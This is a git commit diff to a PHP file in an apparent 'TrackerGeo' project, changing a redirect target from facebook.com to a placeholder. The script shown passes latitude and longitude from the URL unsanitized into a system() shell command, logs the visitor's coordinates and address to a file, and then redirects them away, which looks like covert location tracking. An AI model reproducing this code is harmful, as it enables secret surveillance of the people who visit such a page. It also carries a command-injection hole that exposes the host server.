8add99c094cf0f3f28881fd6cf827b1d8482ef8b
Unamed <34691959+Unam3dd@users.noreply.github.com>
2019-12-22 14:10:08 +0100

    Update get.php

--- TrackerGeo/server/get.php
+++ TrackerGeo/server/get.php
@@ -5,6 +5,6 @@ $long = $_GET['longitude'];
 $command = "/usr/bin/python3 get_addr.py " . $_GET['latitude'] . " " . $_GET['longitude'];
 $cmd = system($command);
 file_put_contents("ip.txt", "Latitude : " . $lat . "\n" . "Longitude : " . $long . "\n" . "Address : " . $cmd . "\n", FILE_APPEND);
-header('Location: https://facebook.com');
+header('Location: LINK');
 exit();
 ?>
